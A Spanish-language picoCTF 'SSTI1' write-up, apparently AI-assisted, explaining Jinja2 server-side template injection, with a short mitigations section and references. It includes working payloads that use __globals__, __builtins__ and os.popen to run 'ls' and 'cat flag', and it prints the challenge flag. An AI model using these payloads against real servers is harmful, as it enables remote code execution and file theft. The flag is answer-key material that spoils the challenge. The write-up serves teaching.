#### Description

I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.
## Solución (pasos esenciales)

1. **Arrancar la instancia del reto** y abrir la página web donde se permite publicar un mensaje/“announcement”. El reto está diseñado para evaluar entradas que luego son renderizadas por el servidor. [Medium](https://medium.com/%40divyanshurds.kumar/ssti1-ctf-writeup-a2aac025008f)
    
2. **Prueba rápida para detectar SSTI**: enviar una expresión Jinja simple como
    

`{{6 + 6}}`

Si la página devuelve `12`, la entrada está siendo evaluada por el motor de plantillas → confirmación de **Server‑Side Template Injection (SSTI)** (probablemente Jinja2 en Flask). [Medium](https://medium.com/%40divyanshurds.kumar/ssti1-ctf-writeup-a2aac025008f)

3. **Exploración del entorno de templates**: usar introspección de objetos de Python para descubrir objetos globales y builtins accesibles, por ejemplo:
    

`{{ self.__init__.__globals__ }} {{ self.__init__.__globals__.__builtins__ }}`

Esto permite ver que `__builtins__` y `__globals__` están disponibles, lo que habilita importar módulos y ejecutar comandos. [Medium](https://medium.com/%40divyanshurds.kumar/ssti1-ctf-writeup-a2aac025008f)

4. **Ejecución de comandos y lectura de archivos**: aprovechar `__import__` para cargar `os` y `popen` para ejecutar comandos. Ejemplos útiles:
    

`# listar archivos en el directorio de la app {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}  # leer el fichero 'flag' {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`

Con la segunda payload se obtiene el contenido del fichero `flag`. [Medium](https://medium.com/%40divyanshurds.kumar/ssti1-ctf-writeup-a2aac025008f)

5. **Flag obtenida**:
    

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}`

(obtenida ejecutando la payload de lectura del fichero). [Medium](https://medium.com/%40divyanshurds.kumar/ssti1-ctf-writeup-a2aac025008f)

---

## Notas adicionales / Buenas prácticas

- **Qué es SSTI:** Server‑Side Template Injection ocurre cuando entrada controlada por el usuario se inserta directamente en plantillas que el servidor evalúa; en motores como **Jinja2** esto puede llevar a ejecución de código en el servidor (RCE). Siempre partir de pruebas sencillas como `{{7*7}}` o `{{6+6}}` para detectar evaluación. [portswigger.net+1](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)
    
- **Introspección en Jinja2:** si una plantilla expone objetos como `self`, `__globals__` o `__builtins__`, se puede usar `__import__` para cargar módulos seguros (p. ej. `os`) y luego `popen`/`read()` para ejecutar comandos y recuperar archivos. [Medium](https://medium.com/%40divyanshurds.kumar/ssti1-ctf-writeup-a2aac025008f)
    
- **Riesgos y mitigaciones:** no permitir que datos del usuario se rendericen con `render()` sin escapado; usar `autoescape`, pasar variables como datos (no como plantilla), y filtrar/validar entradas. Reemplazar o restringir funciones peligrosas en entornos productivos. [portswigger.net](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)
    
- **Herramientas útiles:** navegador + DevTools, Burp Suite para modificar solicitudes, payloads de prueba `{{7*7}}`, y, tras confirmación, payloads de inspección/`__import__` para enumerar/leer. [Medium](https://medium.com/%40divyanshurds.kumar/ssti1-ctf-writeup-a2aac025008f)
    

---

## Referencias

- Write‑up detallado del reto **SSTI1** (ejemplo con payloads y flag). [Medium](https://medium.com/%40divyanshurds.kumar/ssti1-ctf-writeup-a2aac025008f)
    
- PortSwigger — explicación y laboratorios sobre **Server‑Side Template Injection** (conceptos y mitigaciones). [portswigger.net](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)
    
- Otros writeups y walkthroughs de SSTI1 (ejemplos prácticos y vídeos). [Cbarkr Blog+1](https://blog.cbarkr.com/ctf/picoCTF/2025/SSTI1?utm_source=chatgpt.com)